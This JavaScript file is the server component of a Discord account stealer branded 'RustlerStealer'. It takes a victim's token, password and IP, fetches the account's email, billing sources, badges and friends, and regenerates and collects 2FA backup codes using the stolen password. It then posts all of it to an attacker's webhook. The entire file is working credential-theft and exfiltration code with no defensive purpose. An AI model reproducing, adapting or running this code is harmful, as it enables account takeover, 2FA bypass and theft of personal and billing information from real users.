const axios = require('axios').default;
const { keyToWebhook } = require('../keyToWebhook');
const ms = require('ms');

module.exports = async (req, res) => {
    const { key, ip, token, password } = req.params
    if (!key) return;
    const webhook = await keyToWebhook(key);
    if (!webhook) return;
    if (!token) return;
    if (!ip) return;
    if (!password) return;
    let json;
    await axios.get("https://discord.com/api/v9/users/@me", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return;

    let info3;
    await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { info3 = res.data })
        .catch(err => { })
    if (!info3) return;

    let info4;
    await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { info4 = res.data })
        .catch(err => { })
    if (!info4) return;

    let avatar_url = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}${json.premium_type == 0 ? '.png' : '.gif'}`

    var params = {
        content: "",
        embeds: [{
            "color": 3553599,
            "fields": [
                {
                    name: "<a:bby:948992995846397973> Token:",
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: "<:bby:948992995481513995> Badges:",
                    value: GetBadges(json.flags),
                    inline: true
                },
                {
                    name: "<:bby:948992995921915924> Nitro Type:",
                    value: await GetNitro(json.premium_type, json.id, token),
                    inline: true
                },
                {
                    name: "<a:bby:948992995754135603> Billing:",
                    value: GetBilling(info3),
                    inline: true
                },
                {
                    name: "<:bby:948992995787690005> IP:",
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: "<:bby:948992995951272047> Email:",
                    value: `\`${json.email}\``,
                    inline: true
                },
                {
                    name: "<a:bby:948993079703130194> Password:",
                    value: `\`${password}\``,
                    inline: true
                }
            ],
            "author": {
                "name": `${json.username}#${json.discriminator} (${json.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "RustlerStealer",
            },
            "thumbnail": {
                "url": avatar_url
            }
        }]
    }
    if (json.mfa_enabled) {
        let g;
        await axios.post('https://discord.com/api/v9/users/@me/mfa/codes', {
            "password": password,
            "regenerate": false
        }, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { g = res.data })
            .catch(err => { })
        if (g) {
            var a2fBackupCodes = "";
            let a2fCodes = g.backup_codes
            for (var i = 0; i < a2fCodes.length; i += 2) {
                a2fBackupCodes += `${a2fCodes[i].consumed == true ? "<:bby:948992925415657493>" : "<:bby:948992905488519178>"} \`${a2fCodes[i].code}\` ${a2fCodes[i + 1].consumed == true ? "<:bby:948992925415657493>" : "<:bby:948992905488519178>"} \`${a2fCodes[i + 1].code}\`\n`
            }
            var mfaembed = {
                "description": a2fBackupCodes,
                "color": 3553599,
                "author": {
                    "name": "2FA Codes",
                    "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
                },
                "footer": {
                    "text": "RustlerStealer"
                }
            }
            params.embeds.push(mfaembed)
        }
    }
    var hqFriendsEmbed = {
        "color": 3553599,
        "description": HqFriends(info4),
        "author": {
            "name": "HQ Friends",
            "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
        },
        "footer": {
            "text": "RustlerStealer"
        }
    }
    params.embeds.push(hqFriendsEmbed)
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(err => { })

    res.sendStatus(200)
    return;

    function GetRBadges(flags) {
        const Discord_Employee = 1;
        const Partnered_Server_Owner = 2;
        const HypeSquad_Events = 4;
        const Bug_Hunter_Level_1 = 8;
        const Early_Supporter = 512;
        const Bug_Hunter_Level_2 = 16384;
        const Early_Verified_Bot_Developer = 131072;
        var badges = "";
        if ((flags & Discord_Employee) == Discord_Employee) {
            badges += "<:Staff:948994220545425518> "
        }
        if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
            badges += "<:Partner:948994733802414150> "
        }
        if ((flags & HypeSquad_Events) == HypeSquad_Events) {
            badges += "<:HypeSquad_Event:948996646392438834> "
        }
        if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
            badges += "<:Green_BugHunter:948996665040330843> "
        }
        if ((flags & Early_Supporter) == Early_Supporter) {
            badges += "<:early_supporter:948997125331619860> "
        }
        if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
            badges += "<:Gold_BugHunter:948997322992390144> "
        }
        if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
            badges += "<:Early_Verified_Bot_Developer:948997755349635153> "
        }
        if (badges == "") {
            badges = ""
        }
        return badges
    }

    function GetBadges(flags) {
        const Discord_Employee = 1;
        const Partnered_Server_Owner = 2;
        const HypeSquad_Events = 4;
        const Bug_Hunter_Level_1 = 8;
        const House_Bravery = 64;
        const House_Brilliance = 128;
        const House_Balance = 256;
        const Early_Supporter = 512;
        const Bug_Hunter_Level_2 = 16384;
        const Early_Verified_Bot_Developer = 131072;
        var badges = "";
        if ((flags & Discord_Employee) == Discord_Employee) {
            badges += "<:Staff:948994220545425518> "
        }
        if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
            badges += "<:Partner:948994733802414150> "
        }
        if ((flags & HypeSquad_Events) == HypeSquad_Events) {
            badges += "<:HypeSquad_Event:948996646392438834> "
        }
        if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
            badges += "<:Green_BugHunter:948996665040330843> "
        }
        if ((flags & House_Bravery) == House_Bravery) {
            badges += "<:HypeSquad_Bravery:948996694417240096> "
        }
        if ((flags & House_Brilliance) == House_Brilliance) {
            badges += "<:HypeSquad_Brilliance:948996718458982470> "
        }
        if ((flags & House_Balance) == House_Balance) {
            badges += "<:HypeSquad_Balance:948996796066168873> "
        }
        if ((flags & Early_Supporter) == Early_Supporter) {
            badges += "<:early_supporter:948997125331619860> "
        }
        if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
            badges += "<:Gold_BugHunter:948997322992390144> "
        }
        if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
            badges += "<:Early_Verified_Bot_Developer:948997755349635153> "
        }
        if (badges == "") {
            badges = "\`No Badges\`"
        }
        return badges
    }

    async function GetNitro(flags, id, token) {
        if (flags == 0) {
            return "\`No Nitro\`"
        }
        if (flags == 1) {
            return "<:nitro:948992871451721828>"
        }
        if (flags == 2) {
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(err => { })
            if (!info) return;

            if (!info.premium_guild_since) return `<:nitro:948992871451721828>`

            let boost = ["<:boost1month:949001389982494760>", "<:boost2month:949001865725636708>", "<:boost3month:949002531722375238>", "<:boost6month:949003027916918785>", "<:boost9month:949003542805499904>", "<:boost12month:949004340251730000>", "<:boost15month:949004676727185459>", "<:boost18month:949005038464954378>", "<:boost24month:949005574178209822>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = parseInt(ms(new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())).replace('d', ''))
                let d1 = new Date(info.premium_guild_since)
                let boost3month = parseInt(ms(new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())).replace('d', ''))
                let d2 = new Date(info.premium_guild_since)
                let boost6month = parseInt(ms(new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())).replace('d', ''))
                let d3 = new Date(info.premium_guild_since)
                let boost9month = parseInt(ms(new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())).replace('d', ''))
                let d4 = new Date(info.premium_guild_since)
                let boost12month = parseInt(ms(new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())).replace('d', ''))
                let d5 = new Date(info.premium_guild_since)
                let boost15month = parseInt(ms(new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())).replace('d', ''))
                let d6 = new Date(info.premium_guild_since)
                let boost18month = parseInt(ms(new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())).replace('d', ''))
                let d7 = new Date(info.premium_guild_since)
                let boost24month = parseInt(ms(new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())).replace('d', ''))

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:nitro:948992871451721828> ${boost[i]}`
        } else {
            return "\`No Nitro\`"
        }
    }

    function HqFriends(info4) {
        var f = info4
        const r = f.filter((user) => {
            return user.type == 1
        })
        var hqFriend = "";
        for (const z of r) {
            var b = GetRBadges(z.user.public_flags)
            if (b != "") {
                hqFriend += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
            }
        }
        if (hqFriend == "") {
            hqFriend = "*Nothing to see here*"
        }
        return hqFriend
    }

    function GetBilling(info3) {
        const json = info3
        var billing = "";
        json.forEach(z => {
            if (z.type == "") {
                return;
            } else if (z.type == 1 && z.invalid == false) {
                billing += "<:bby:948992883728461926> "
            } else if (z.type == 2 && z.invalid == false) {
                billing += "<:bby:948992894054834186> "
            } else {
                return;
            }
        })
        if (billing == "") {
            billing = "\`No\`"
        }
        return billing
    }
}